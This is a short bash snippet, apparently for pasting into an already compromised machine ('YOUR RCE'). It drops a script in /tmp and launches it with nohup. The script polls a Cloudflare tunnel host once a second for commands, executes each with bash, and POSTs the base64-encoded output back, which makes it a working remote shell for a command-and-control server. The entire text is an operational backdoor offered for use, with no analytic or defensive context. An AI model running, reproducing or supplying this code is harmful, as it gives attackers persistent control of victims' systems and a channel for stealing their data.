# PASTE THIS ENTIRE BLOCK INTO YOUR RCE
cat << 'EOF' > /tmp/clean_shell.sh
#!/bin/bash
C2="https://italiano-successfully-rear-engage.trycloudflare.com"
LOCK="/tmp/shell.lock"

# Kill duplicates and self
pkill -f sync_verify.sh 2>/dev/null
pkill -f silent_shell.sh 2>/dev/null

while true; do
  # 1-second pulse
  CMD=$(curl -s -L --max-time 1 "$C2")
  
  if [[ -n "$CMD" && "$CMD" != "none" ]]; then
    # Execute and capture
    RESULT=$(/bin/bash -c "$CMD" 2>&1)
    
    # Base64 encode without newlines
    [ -z "$RESULT" ] && RESULT=" "
    payload=$(echo "$RESULT" | base64 | tr -d '\n')
    
    # Send back
    curl -s -X POST -d "$payload" "$C2" > /dev/null
  fi
  sleep 1
done
EOF

chmod +x /tmp/clean_shell.sh
# Kill any existing clean_shells and start fresh
pkill -f clean_shell.sh; nohup /tmp/clean_shell.sh >/dev/null 2>&1 &
